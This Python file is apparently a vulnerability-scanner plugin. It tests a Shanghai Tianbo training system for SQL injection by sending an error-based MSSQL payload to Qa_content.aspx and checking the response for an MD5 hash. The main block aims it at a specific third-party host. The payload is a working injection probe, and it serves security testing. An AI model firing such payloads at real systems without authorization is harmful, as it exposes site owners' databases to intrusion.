#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = m01lym0on
#_PlugName_ = 上海天柏信息科技培训系统通用SQL注入漏洞
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2015-0120630
import re
def assign(service, arg):
    if service == 'tianbo_train':
        return True, arg
def audit(arg):
    payload = 'Webpage/Qa_content.aspx?info=4124%20and%201=sys.fn_varbintohexstr%28hashbytes%28%27MD5%27,%271234%27%29%29%20'
    target = arg + payload
    
    code, head, res, errcode, _ = curl.curl2(target);
    if code == 500 and "81dc9bdb52d04dc20036dbd8313ed055" in res:
        security_hole(target)
if __name__ == '__main__':
    from dummy import *
    audit(assign('tianbo_train', 'http://px2.timber2005.com/')[1])